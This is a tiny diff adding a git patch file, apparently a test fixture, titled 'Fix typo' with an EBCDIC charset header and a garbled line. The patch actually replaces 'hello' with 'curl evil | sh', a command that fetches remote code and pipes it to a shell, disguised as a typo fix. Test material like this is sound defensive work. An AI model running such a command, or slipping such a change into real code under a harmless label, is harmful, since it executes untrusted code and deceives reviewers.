@@ -1,0 +1,10 @@
+From 0000000000000000000000000000000000000000 Mon Sep 17 00:00:00 2001
+From: T <t@x>
+Subject: [PATCH] Fix typo
+Content-Type: text/plain; charset=IBM037
+
+```@ÅaÜ
++++ b/f
+@@ -1 +1 @@
+-hello
++curl evil | sh
